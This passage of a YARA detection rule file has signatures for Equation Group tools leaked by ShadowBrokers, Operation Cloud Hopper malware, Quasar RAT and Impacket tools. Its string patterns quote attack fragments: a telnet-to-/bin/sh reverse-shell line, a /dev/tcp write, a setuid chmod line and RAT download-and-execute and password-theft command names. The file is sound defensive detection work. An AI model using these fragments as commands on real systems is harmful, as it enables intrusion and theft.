uint16 ( 0 ) == 0x457f and filesize < 30KB and 3 of them ) or ( all of them )\n}\n\nrule EquationGroup_parsescan_RID3083 : APT DEMO G0020 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file parsescan\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 12:43:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"942c12067b0afe9ebce50aa9dfdbf64e6ed0702d9a3a00d25b4fca62a38369ef\"\n      tags = \"APT, DEMO, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$gotgs=1 if (($line =~ /Scan for (Sol|SNMP)\\\\s+version/) or\" fullword ascii\n      $s2 = \"Usage:  $prog [-f file] -p prognum [-V ver] [-t proto] -i IPadr\" fullword ascii\n   condition: \n      filesize < 250KB and 1 of them\n}\n\nrule EquationGroup_jscan_RID2ED2 : APT DEMO G0020 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file jscan\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 11:30:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"8075f56e44185e1be26b631a2bad89c5e4190c2bfc9fa56921ea3bbc51695dbe\"\n      tags = \"APT, DEMO, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$scanth = $scanth . \\\" -s \\\" . $scanthreads;\" fullword ascii\n      $s2 = \"print \\\"java -jar jscanner.jar$scanth$list\\\\n\\\";\" fullword ascii\n   condition: \n      filesize < 250KB and 1 of them\n}\n\nrule EquationGroup_promptkill_RID3111 : APT DEMO G0020 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file promptkill\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 13:06:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"b448204503849926be249a9bafbfc1e36ef16421c5d3cfac5dac91f35eeaa52d\"\n      tags = \"APT, DEMO, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"exec(\\\"xterm $xargs -e /current/tmp/promptkill.kid.$tag $pid\\\");\" fullword ascii\n      $x2 = \"$xargs=\\\"-title \\\\\\\"Kill process $pid?\\\\\\\" -name \\\\\\\"Kill process $pid?\\\\\\\" -bg white -fg red -geometry 202x19+0+0\\\" ;\" fullword ascii\n   condition: \n      filesize < 250KB and 1 of them\n}\n\nrule EquationGroup_epoxyresin_v1_0_0_RID333D : APT DEMO FILE G0020 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file epoxyresin.v1.0.0.1\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 14:39:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"eea8a6a674d5063d7d6fc9fe07060f35b16172de6d273748d70576b01bf01c73\"\n      tags = \"APT, DEMO, FILE, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[-] kernel not vulnerable\" fullword ascii\n      $s1 = \".tmp.%d.XXXXXX\" fullword ascii\n      $s2 = \"[-] couldn't create temp file\" fullword ascii\n      $s3 = \"/boot/System.map-%s\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 30KB and $x1 ) or ( all of them )\n}\n\nrule EquationGroup_estopmoonlit_RID31F0 : APT DEMO G0020 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file estopmoonlit\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 13:43:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"707ecc234ed07c16119644742ebf563b319b515bf57fd43b669d3791a1c5e220\"\n      tags = \"APT, DEMO, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[+] shellcode prepared, re-executing\" fullword ascii\n      $x2 = \"[-] kernel not vulnerable: prctl\" fullword ascii\n      $x3 = \"[-] shell failed\" fullword ascii\n      $x4 = \"[!] selinux apparently enforcing.  Continue [y|n]? \" fullword ascii\n   condition: \n      filesize < 250KB and 1 of them\n}\n\nrule EquationGroup_envoytomato_RID3188 : APT DEMO G0020 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file envoytomato\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 13:26:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"9bd001057cc97b81fdf2450be7bf3b34f1941379e588a7173ab7fffca41d4ad5\"\n      tags = \"APT, DEMO, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[-] kernel not vulnerable\" fullword ascii\n      $s2 = \"[-] failed to spawn shell\" fullword ascii\n   condition: \n      filesize < 250KB and 1 of them\n}\n\nrule EquationGroup_smash_RID2EDF : APT DEMO G0020 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file smash\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 11:33:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"1dc94b46aaff06d65a3bf724c8701e5f095c1c9c131b65b2f667e11b1f0129a6\"\n      tags = \"APT, DEMO, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"T=<target IP> [O=<port>] Y=<target type>\" fullword ascii\n      $x2 = \"no command given!! bailing...\" fullword ascii\n      $x3 = \"no port. assuming 22...\" fullword ascii\n   condition: \n      filesize < 250KB and 1 of them\n}\n\nrule EquationGroup_ratload_RID2FAA : APT DEMO G0020 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file ratload\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 12:06:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"4a4a8f2f90529bee081ce2188131bac4e658a374a270007399f80af74c16f398\"\n      tags = \"APT, DEMO, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"/tmp/ratload.tmp.sh\" fullword ascii\n      $x2 = \"Remote Usage: /bin/telnet locip locport < /dev/console | /bin/sh\\\"\" fullword ascii\n      $s6 = \"uncompress -f ${NAME}.Z && PATH=. ${ARGS1} ${NAME} ${ARGS2} && rm -f ${NAME}\" fullword ascii\n   condition: \n      filesize < 250KB and 1 of them\n}\n\nrule EquationGroup_ys_RID2DAF : APT DEMO G0020 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file ys.auto\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 10:42:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"a6387307d64778f8d9cfc60382fdcf0627cde886e952b8d73cc61755ed9fde15\"\n      tags = \"APT, DEMO, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"EXPLOIT_SCRIPME=\\\"$EXPLOIT_SCRIPME\\\"\" fullword ascii\n      $x3 = \"DEFTARGET=`head /current/etc/opscript.txt 2>/dev/null | grepip 2>/dev/null | head -1`\" fullword ascii\n      $x4 = \"FATAL ERROR: -x port and -n port MUST NOT BE THE SAME.\" fullword ascii\n   condition: \n      filesize < 250KB and 1 of them\n}\n\nrule EquationGroup_ewok_RID2E79 : APT DEMO FILE G0020 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file ewok\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 11:16:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"567da502d7709b7814ede9c7954ccc13d67fc573f3011db04cf212f8e8a95d72\"\n      tags = \"APT, DEMO, FILE, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Example: ewok -t target public\" fullword ascii\n      $x2 = \"Usage:  cleaner host community fake_prog\" fullword ascii\n      $x3 = \"-g  - Subset of -m that Green Spirit hits \" fullword ascii\n      $x4 = \"--- ewok version\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 80KB and 1 of them )\n}\n\nrule EquationGroup_xspy_RID2E97 : APT DEMO FILE G0020 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file xspy\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 11:21:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"841e065c9c340a1e522b281a39753af8b6a3db5d9e7d8f3d69e02fdbd662f4cf\"\n      tags = \"APT, DEMO, FILE, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"USAGE: xspy -display <display> -delay <usecs> -up\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 60KB and all of them )\n}\n\nrule EquationGroup_estesfox_RID3034 : APT DEMO G0020 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file estesfox\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 12:29:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"33530cae130ee9d9deeee60df9292c00242c0fe6f7b8eedef8ed09881b7e1d5a\"\n      tags = \"APT, DEMO, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"chown root:root x;chmod 4777 x`' /tmp/logwatch.$2/cron\" fullword ascii\n   condition: \n      all of them\n}\n\nrule EquationGroup_elatedmonkey_1_0_1_1_RID3404 : APT DEMO G0020 SCRIPT {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file elatedmonkey.1.0.1.1.sh\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 15:12:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2022-08-18\"\n      hash1 = \"bf7a9dce326604f0681ca9f7f1c24524543b5be8b6fcc1ba427b18e2a4ff9090\"\n      tags = \"APT, DEMO, G0020, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Usage: $0 ( -s IP PORT | CMD )\" fullword ascii\n      $s2 = \"os.execl(\\\"/bin/sh\\\", \\\"/bin/sh\\\", \\\"-c\\\", \\\"$CMD\\\")\" fullword ascii\n      $s3 = \"PHP_SCRIPT=\\\"$HOME/public_html/info$X.php\\\"\" fullword ascii\n      $s4 = \"cat > /dev/tcp/127.0.0.1/80 <<\" ascii\n   condition: \n      filesize < 15KB and 2 of them\n}\n\nrule EquationGroup_scanner_RID2FAD : APT DEMO G0020 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file scanner\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 12:07:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"dcbcd8a98ec93a4e877507058aa26f0c865b35b46b8e6de809ed2c4b3db7e222\"\n      tags = \"APT, DEMO, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"program version netid     address             service         owner\" fullword ascii\n      $x4 = \"*** Sorry about the raw output, I'll leave it for now\" fullword ascii\n      $x5 = \"-scan winn %s one\" fullword ascii\n   condition: \n      filesize < 250KB and 1 of them\n}\n\nrule EquationGroup__ftshell_ftshell_v3_10_3_0_RID364E : APT DEMO FILE G0020 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- from files ftshell, ftshell.v3.10.3.7\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 16:50:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"9bebeb57f1c9254cb49976cc194da4be85da4eb94475cb8d813821fb0b24f893\"\n      hash2 = \"0be739024b41144c3b63e40e46bab22ac098ccab44ab2e268efc3b63aea02951\"\n      tags = \"APT, DEMO, FILE, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"set uRemoteUploadCommand \\\"[exec cat /current/.ourtn-ftshell-upcommand]\\\"\" fullword ascii\n      $s2 = \"send \\\"\\\\[ \\\\\\\"\\\\$BASH\\\\\\\" = \\\\\\\"/bin/bash\\\\\\\" -o \\\\\\\"\\\\$SHELL\\\\\\\" = \\\\\\\"/bin/bash\\\\\\\" \\\\] &&\" ascii\n      $s3 = \"system rm -f /current/tmp/ftshell.latest\" fullword ascii\n      $s4 = \"# ftshell -- File Transfer Shell\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x2123 and filesize < 100KB and 1 of them ) or ( 2 of them )\n}\n\nrule EquationGroup__scanner_scanner_v2_1_2_RID357D : APT DEMO FILE G0020 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- from files scanner, scanner.v2.1.2\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 16:15:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"dcbcd8a98ec93a4e877507058aa26f0c865b35b46b8e6de809ed2c4b3db7e222\"\n      hash2 = \"9807aaa7208ed6c5da91c7c30ca13d58d16336ebf9753a5cea513bcb59de2cff\"\n      tags = \"APT, DEMO, FILE, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Welcome to the network scanning tool\" fullword ascii\n      $s2 = \"Scanning port %d\" fullword ascii\n      $s3 = \"/current/down/cmdout/scans\" fullword ascii\n      $s4 = \"Scan for SSH version\" fullword ascii\n      $s5 = \"program vers proto   port  service\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 100KB and 2 of them ) or ( all of them )\n}\n\nrule EquationGroup__ghost_sparc_ghost_x86_3_RID361A : APT DEMO FILE G0020 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- from files ghost_sparc, ghost_x86\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 16:41:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"d5ff0208d9532fc0c6716bd57297397c8151a01bf4f21311f24e7a72551f9bf1\"\n      hash2 = \"82c899d1f05b50a85646a782cddb774d194ef85b74e1be642a8be2c7119f4e33\"\n      tags = \"APT, DEMO, FILE, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Usage: %s [-v os] [-p] [-r] [-c command] [-a attacker] target\" fullword ascii\n      $x2 = \"Sending shellcode as part of an open command...\" fullword ascii\n      $x3 = \"cmdshellcode\" fullword ascii\n      $x4 = \"You will not be able to run the shellcode. Exiting...\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 70KB and 1 of them ) or ( 2 of them )\n}\n\nrule EquationGroup__pclean_v2_1_1_pclean_v2_1_1_4_RID3748 : APT DEMO FILE G0020 LINUX {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- from files pclean.v2.1.1.0-linux-i386, pclean.v2.1.1.0-linux-x86_64\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 17:31:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"cdb5b1173e6eb32b5ea494c38764b9975ddfe83aa09ba0634c4bafa41d844c97\"\n      hash2 = \"ab7f26faed8bc2341d0517d9cb2bbf41795f753cd21340887fc2803dc1b9a1dd\"\n      tags = \"APT, DEMO, FILE, G0020, LINUX\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"-c cmd_name:     strncmp() search for 1st %d chars of commands that \" fullword ascii\n      $s2 = \"e.g.: -n 1-1024,1080,6666,31337 \" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 50KB and all of them )\n}\n\nrule EquationGroup__jparsescan_parsescan_5_RID35FF : APT DEMO FILE G0020 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- from files jparsescan, parsescan\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 16:37:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"8c248eec0af04300f3ba0188fe757850d283de84cf42109638c1c1280c822984\"\n      hash2 = \"942c12067b0afe9ebce50aa9dfdbf64e6ed0702d9a3a00d25b4fca62a38369ef\"\n      tags = \"APT, DEMO, FILE, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"# default is to dump out all scanned hosts found\" fullword ascii\n      $s2 = \"$bool .= \\\" -r \\\" if (/mibiisa.* -r/);\" fullword ascii\n      $s3 = \"sadmind is available on two ports, this also works)\" fullword ascii\n      $s4 = \"-x IP      gives \\\\\\\"hostname:# users:load ...\\\\\\\" if positive xwin scan\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x2123 and filesize < 40KB and 1 of them ) or ( 2 of them )\n}\n\nrule EquationGroup__funnelout_v4_1_0_1_RID33BA : APT DEMO FILE G0020 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- from files funnelout.v4.1.0.1.pl\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 15:00:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash2 = \"457ed14e806fdbda91c4237c8dc058c55e5678f1eecdd78572eff6ca0ed86d33\"\n      tags = \"APT, DEMO, FILE, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"header(\\\"Set-Cookie: bbsessionhash=\\\" . \\\\$hash . \\\"; path=/; HttpOnly\\\");\" fullword ascii\n      $s2 = \"if ($code =~ /proxyhost/) {\" fullword ascii\n      $s3 = \"\\\\$rk[1] = \\\\$rk[1] - 1;\" ascii\n      $s4 = \"#existsUser($u) or die \\\"User '$u' does not exist in database.\\\\n\\\";\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x2123 and filesize < 100KB and 2 of them ) or ( all of them )\n}\n\nrule EquationGroup__magicjack_v1_1_0_0_client_RID364E : APT DEMO FILE G0020 SCRIPT {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- from files magicjack_v1.1.0.0_client-1.1.0.0.py\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 16:50:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"63292a2353275a3bae012717bb500d5169cd024064a1ce8355ecb4e9bfcdfdd1\"\n      tags = \"APT, DEMO, FILE, G0020, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"temp = ((left >> 1) ^ right) & 0x55555555\" fullword ascii\n      $s2 = \"right ^= (temp <<  16) & 0xffffffff\" fullword ascii\n      $s3 = \"tempresult = \\\"\\\"\" fullword ascii\n      $s4 = \"num = self.bytes2long(data)\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x2123 and filesize < 80KB and 3 of them ) or ( all of them )\n}\n\nrule EquationGroup__ftshell_RID3014 : APT DEMO FILE G0020 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- from files ftshell, ftshell.v3.10.3.7\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 12:24:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"9bebeb57f1c9254cb49976cc194da4be85da4eb94475cb8d813821fb0b24f893\"\n      tags = \"APT, DEMO, FILE, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"if { [string length $uRemoteUploadCommand]\" fullword ascii\n      $s2 = \"processUpload\" fullword ascii\n      $s3 = \"global dothisreallyquiet\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x2123 and filesize < 100KB and 2 of them ) or ( all of them )\n}\n\nrule OpCloudHopper_WmiDLL_inMemory_RID324C : APT DEMO {\n   meta:\n      description = \"Malware related to Operation Cloud Hopper - Page 25\"\n      author = \"Florian Roth\"\n      reference = \"https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf\"\n      date = \"2017-04-07 13:59:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"wmi.dll 2>&1\" ascii\n   condition: \n      all of them\n}\n\nrule karmaSMB_RID29FF : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Compiled Impacket Tools\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 02:50:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"d256d1e05695d62a86d9e76830fcbb856ba7bd578165a561edd43b9f7fdb18a3\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"bkarmaSMB_RID29FF.exe.manifest\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 17000KB and all of them )\n}\n\nrule Quasar_RAT_1_RID2B54 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Quasar RAT\"\n      author = \"Florian Roth\"\n      reference = \"https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf\"\n      date = \"2017-04-07 09:01:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"0774d25e33ca2b1e2ee2fafe3fdbebecefbf1d4dd99e6460f0bc8713dd0fd740\"\n      hash2 = \"1ce40a89ef9d56fd32c00db729beecc17d54f4f7c27ff22f708a957cd3f9a4ec\"\n      hash3 = \"515c1a68995557035af11d818192f7866ef6a2018aa13112fefbe08395732e89\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"DoUploadAndExecute\" fullword ascii\n      $s2 = \"DoDownloadAndExecute\" fullword ascii\n      $s3 = \"DoShellExecute\" fullword ascii\n      $s4 = \"set_Processname\" fullword ascii\n      $op1 = { 04 1e fe 02 04 16 fe 01 60 } \n      $op2 = { 00 17 03 1f 20 17 19 15 28 } \n      $op3 = { 00 04 03 69 91 1b 40 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and all of ( $s* ) or all of ( $op* ) )\n}\n\nrule Quasar_RAT_2_RID2B55 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Quasar RAT\"\n      author = \"Florian Roth\"\n      reference = \"https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf\"\n      date = \"2017-04-07 09:02:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"0774d25e33ca2b1e2ee2fafe3fdbebecefbf1d4dd99e6460f0bc8713dd0fd740\"\n      hash2 = \"515c1a68995557035af11d818192f7866ef6a2018aa13112fefbe08395732e89\"\n      hash3 = \"f08db220df716de3d4f63f3007a03f902601b9b32099d6a882da87312f263f34\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"GetKeyloggerLogsResponse\" fullword ascii\n      $x2 = \"get_Keylogger\" fullword ascii\n      $x3 = \"HandleGetKeyloggerLogsResponse\" fullword ascii\n      $s1 = \"DoShellExecuteResponse\" fullword ascii\n      $s2 = \"GetPasswordsResponse\" fullword ascii\n      $s3 = \"GetStartupItemsResponse\" fullword ascii\n      $s4 = \"<GetGenReader>b__7\" fullword ascii\n      $s5 = \"RunHidden\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and $x1 ) or ( all of them )\n}\n\nrule Malware_Floxif_mpsvc_dll_RID30C4 : DEMO EXE FILE HIGHVOL MAL {\n   meta:\n      description = \"Malware - Floxif\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-04-07 12:53:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"1e654ee1c4736f4ccb8b5b7aa604782cfb584068df4d9e006de8009e60ab5a14\"\n      tags = \"DEMO, EXE, FILE, HIGHVOL, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op1 = { 04 80 7a 03 01 75 04 8d 42 04 c3 8d 42 04 53 8b } \n      $op2 = { 88 19 74 03 41 eb ea c6 42 03 01 5b c3 8b 4c 24 } \n      $op3 = { ff 03 8d 00 f9 ff ff 88 01 eb a1 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them )\n}\n\nrule OpCloudHopper_lockdown_RID2FF5 : APT DEMO EXE FILE {\n   meta:\n      description = \"Tools related to Operation Cloud Hopper\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 12:19:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"8ca61cef74573d9c1d19b8191c23cbd2b7a1195a74eaba037377e5ee232b1dc5\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"lockdown.dll\" fullword ascii\n      $s3 = \"mfeann.exe\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )\n}\n\nrule OpCloudHopper_WindowXarBot_RID315C : APT DEMO EXE FILE {\n   meta:\n      description = \"Malware related to Operation Cloud Hopper\"\n      author = \"Florian Roth\"\n      reference = \"https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf\"\n      date = \"2017-04-07 13:19:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\Release\\\\WindowXarbot.pdb\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )\n}\n\nrule VBS_WMIExec_Tool_Apr17_1_RID2F44 : APT DEMO SCRIPT {\n   meta:\n      description = \"Tools related to Operation Cloud Hopper\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/maaaaz/impacket-examples-windows\"\n      date = \"2017-04-07 11:49:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"21bc328ed8ae81151e7537c27c0d6df6d47ba8909aebd61333e32155d01f3b11\"\n      tags = \"APT, DEMO, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n  